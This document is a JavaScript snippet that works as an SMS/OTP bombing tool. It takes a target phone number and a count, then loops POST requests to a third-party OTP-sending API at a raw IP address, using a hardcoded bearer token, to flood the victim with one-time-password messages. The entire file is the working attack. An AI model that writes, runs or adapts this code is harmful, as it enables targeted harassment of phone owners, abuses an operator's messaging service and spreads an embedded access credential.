$('#submit').click(() => {
    const number = $('#phone').val();
    const amount = $('#amount').val();

    if (number.length !== 11) {
        alert("Wrong number");
    } else if (amount.length === 0) {
        alert("Wrong amount");
    } else {
        let i = 0;

        const sendOtp = () => {
            const otpData = {
                "msisdn": "88" + number,
                "operator": "robi",
                "secret_key": ""
            };

            const otpConfig = {
                method: 'post',
                url: 'http://103.4.145.86:6005/api/v1/user/otp/send',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer 2Comics4mh5ln64ron5t26kpvm3toBlog'
                },
                data: JSON.stringify(otpData)
            };

            return axios(otpConfig);
        };

        const sendAllOtps = async () => {
            try {
                while (i < amount) {
                    await sendOtp();
                    i++;
                }
                alert("OTP(s) successfully sent");
            } catch (error) {
                console.error('API Error:', error);
                alert("Failed to send OTP(s)");
            }
        };

        sendAllOtps();
    }
});
